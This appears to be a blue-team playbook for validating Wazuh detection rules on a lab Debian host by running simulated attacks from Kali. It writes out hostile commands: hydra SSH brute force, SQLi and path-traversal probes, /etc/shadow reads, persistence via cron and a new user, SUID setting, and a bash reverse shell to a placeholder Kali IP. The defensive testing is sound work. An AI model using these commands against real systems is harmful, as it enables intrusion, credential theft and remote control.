# Kali & Debian Host Detection Test Playbook

Tests Wazuh 4.14 logging and custom `ccdc_linux_rules.xml` alerts against a single Debian host (`000`, no external agents yet).

Replace `<DEBIAN_IP>` with your Debian server's IP and `<KALI_IP>` with your Kali VM's IP.

---

## Part 1: Kali Attacks Against the Debian Host

### 1. SSH Brute Force (`hydra`)
*(Requires `openssh-server` running on Debian.)*
```bash
hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://<DEBIAN_IP>
```
*(Press `Ctrl+C` after ~10 attempts. Or without wordlists: `for i in {1..7}; do ssh -o BatchMode=yes -o ConnectTimeout=2 fakeuser@<DEBIAN_IP> 2>/dev/null; done`)*

- **Where to check**:
  1. **Threat Hunting -> Events**: filter `rule.id:(102002 OR 5710 OR 5720)`
  2. **CLI**: `sudo grep -E '102002|5710|5720' /var/ossec/logs/alerts/alerts.log`
- **What you should see**:
  - `5710` (Level 5) for each failed SSH attempt, then **`102002`** (Level 12): `CCDC Linux: SSH brute force attack from <KALI_IP>`
  - `data.srcip`: `<KALI_IP>`, `rule.mitre.id`: `T1110`

---

### 2. Root SSH Login Attempt
```bash
ssh root@<DEBIAN_IP>
```
*(If root SSH login succeeds, it triggers `102003`; if denied, it triggers `5710`/`5712`.)*

- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:(102003 OR 5712 OR 5710)`
- **What you should see**:
  - On success: **`102003`** (Level 12): `CCDC Linux: Successful root login via SSH from <KALI_IP>` (`T1078.003`, `T1021.004`)

---

### 3. Nmap Service Scan (Port Visibility Check)
```bash
nmap -sV -p 22,443,1514,1515,55000 <DEBIAN_IP>
```
- **Where to check**:
  1. **Threat Hunting -> Events**: filter `data.srcip:<KALI_IP>`
  2. **Server management -> Dev Tools** (compare open ports on `000`): `GET /syscollector/000/ports`
- **What you should see**:
  - Note: Wazuh has no Suricata/Zeek sensor, so a pure TCP scan only logs if a service (e.g., `sshd` or `wazuh-authd` on `1515`) logs a malformed/closed connection.
  - `GET /syscollector/000/ports` shows all listening ports (`443`, `1514`, `1515`, `9200`, `55000`, etc.).

---

### 4. Web SQLi & Path Traversal Probe *(only if Apache/Nginx is installed on Debian)*
```bash
curl -s "http://<DEBIAN_IP>/?id=1%20union%20select%201,2,3" >/dev/null
curl -s "http://<DEBIAN_IP>/../../../../etc/passwd" >/dev/null
```
- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:102016`
- **What you should see**:
  - **`102016`** (Level 10): `CCDC Linux Web: Possible SQLi, path traversal, or webshell request` (`T1190`)

---

## Part 2: Simulated Post-Exploit Tests on the Debian Host

Run these directly on the Debian server to simulate an attacker who landed a shell.

### 5. Host Discovery (`auditd` `execve`)
```bash
whoami; uname -a; cat /etc/passwd >/dev/null; ss -tulpn >/dev/null
```
- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:102013`
- **What you should see**:
  - **`102013`** (Level 7): `CCDC Linux Audit: Host discovery command executed`
  - Expand row -> **JSON**: `data.audit.exe`, `data.audit.comm`, `data.audit.ppid`

---

### 6. Persistence & Account Manipulation (FIM + Syslog)
```bash
sudo touch /etc/cron.d/redteam_test
sudo useradd testred
sudo mkdir -p /root/.ssh && sudo touch /root/.ssh/authorized_keys
```
Cleanup after checking alerts:
```bash
sudo rm -f /etc/cron.d/redteam_test
sudo userdel testred
```
- **Where to check**:
  1. **Threat Hunting -> Events**: filter `rule.groups:persistence OR rule.id:(102001 OR 102006 OR 102010 OR 5902)`
  2. **Endpoint security -> File Integrity Monitoring** (select `000` or filter `syscheck.path:/etc/cron.d/redteam_test`)
- **What you should see**:
  - **`102001`** (Level 10): `Privilege escalation or user/sudoers modification detected` (`useradd`)
  - **`102006`** (Level 12): `Critical system/auth/persistence file modified (/etc/cron.d/redteam_test)`
  - **`102010`** (Level 12): `Persistence file modified (/root/.ssh/authorized_keys)`
  - **`550`/`554`** (FIM file added/modified with `syscheck.sha256_after`)

---

### 7. Reverse Shell & Live C2 Port/Process Check
On **Kali** (start listener):
```bash
nc -lvnp 4444
```
On **Debian** (connect and hold open for ~4 minutes so Syscollector's `3m` interval catches it):
```bash
bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```
- **Where to check**:
  1. **Threat Hunting -> Events**: filter `rule.id:102009`
  2. **Server management -> Dev Tools** (while shell is open):
     ```text
     GET /syscollector/000/processes?search=bash
     GET /syscollector/000/ports?remote.ip=<KALI_IP>
     ```
- **What you should see**:
  - **`102009`** (Level 11): `CCDC Linux: Reverse shell or piped payload execution detected` (`T1059.004`, `T1105`)
  - **Dev Tools `/ports`**: `ESTABLISHED` outbound TCP connection to `<KALI_IP>:4444`
  - **Dev Tools `/processes`**: interactive `bash` process

---

### 8. Temp-Directory Execution (`/tmp`)
```bash
printf '#!/bin/sh\nid\n' > /tmp/redteam_bin.sh && chmod +x /tmp/redteam_bin.sh && /tmp/redteam_bin.sh
rm -f /tmp/redteam_bin.sh
```
- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:102008`
- **What you should see**:
  - **`102008`** (Level 12): `CCDC Linux Audit: Execution from temp/shm or deleted/memfd binary (/tmp/redteam_bin.sh)`

---

### 9. Credential Access (`/etc/shadow`) & SUID Abuse
```bash
sudo cat /etc/shadow >/dev/null
cp /bin/true /tmp/suid_test && sudo chmod +s /tmp/suid_test
rm -f /tmp/suid_test
```
- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:102012`
- **What you should see**:
  - **`102012`** (Level 12): `CCDC Linux Audit: SUID/capability abuse or /etc/shadow access` (`T1548.001`, `T1003.008`)

---

### 10. Collection / Archive Staging
```bash
tar -czf /tmp/loot_test.tar.gz /etc/passwd 2>/dev/null
rm -f /tmp/loot_test.tar.gz
```
- **Where to check**: **Threat Hunting -> Events** -> filter `rule.id:102014`
- **What you should see**:
  - **`102014`** (Level 10): `CCDC Linux Audit: Database dump or archive staging executed` (`T1560`)
